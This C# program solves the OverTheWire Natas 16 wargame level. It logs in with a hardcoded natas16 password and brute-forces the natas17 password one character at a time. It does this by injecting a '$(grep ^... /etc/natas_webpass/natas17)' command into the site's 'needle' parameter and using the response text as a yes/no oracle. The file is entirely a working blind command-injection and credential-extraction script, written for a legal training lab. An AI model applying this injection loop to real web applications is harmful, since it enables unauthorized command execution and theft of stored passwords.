using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace BruteNatas2
{
    class Program
    {
        static void Main(string[] args)
        {
            string sumvols = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string html = "";
            string login = "natas16";
            string password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh";
            string n17pass = "";
            for (int z = 0; z < 50; z++)
            {
                for (int i = 0; i < sumvols.Length; i++)
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create($"http://natas16.natas.labs.overthewire.org/?needle=abbreviating$(grep%20^{n17pass + sumvols.ElementAt(i)}%20/etc/natas_webpass/natas17)");
                    req.Credentials = new NetworkCredential(login, password);
                    using (HttpWebResponse res = (HttpWebResponse)req.GetResponse())
                    {
                        if (res.StatusCode == HttpStatusCode.OK)
                        {
                            using (Stream str = res.GetResponseStream())
                            {
                                using (StreamReader reader = new StreamReader(str))
                                {
                                    html = reader.ReadToEnd();
                                    if (!html.Contains("abbreviating"))
                                    {
                                        n17pass += sumvols.ElementAt(i);
                                        Console.WriteLine(n17pass);
                                        break;
                                    }
                                }
                            }
                        }
                    }

                }

            }
            Console.ReadLine();
        }
    }
}
